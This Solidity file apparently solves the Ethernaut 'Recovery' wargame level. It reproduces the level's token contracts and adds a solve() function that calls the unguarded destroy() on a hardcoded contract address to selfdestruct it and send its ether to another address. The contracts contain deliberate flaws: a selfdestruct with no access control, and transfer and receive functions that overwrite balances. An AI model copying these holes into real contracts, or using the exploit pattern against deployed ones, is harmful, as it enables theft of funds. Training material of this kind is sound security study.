// SPDX-License-Identifier: MIT
pragma solidity ^0.6.0;

//import '@openzeppelin/contracts/math/SafeMath.sol';

contract Recovery {

  //generate tokens
  function generateToken(string memory _name, uint256 _initialSupply) public {
    new SimpleToken(_name, msg.sender, _initialSupply);
  
  }
}

contract SimpleToken {

  //using SafeMath for uint256;
  // public variables
  string public name;
  mapping (address => uint) public balances;

  // constructor
  constructor(string memory _name, address _creator, uint256 _initialSupply) public {
    name = _name;
    balances[_creator] = _initialSupply;
  }

  // collect ether in return for tokens
  receive() external payable {
    balances[msg.sender] = msg.value * 10;
  }

  // allow transfers of tokens
  function transfer(address _to, uint _amount) public { 
    require(balances[msg.sender] >= _amount);
    balances[msg.sender] = balances[msg.sender] - _amount;
    balances[_to] = _amount;
  }

  // clean up after ourselves
  function destroy(address payable _to) public {
    selfdestruct(_to);
  }
}

contract ethernautRecovery {
    function solve() public {
        //0x812EEe9feb0d24Cfe884d60B3a623Bf52aD3e2D7
        //0x996DD86C5210a3bDd0f31C74E615cE2F7c214048
        address payable destroyTarget = payable(0x996DD86C5210a3bDd0f31C74E615cE2F7c214048);
        SimpleToken(destroyTarget).destroy(payable(0x798349E06c67272465123B91bd88C5d19b8c7878));
    }
}
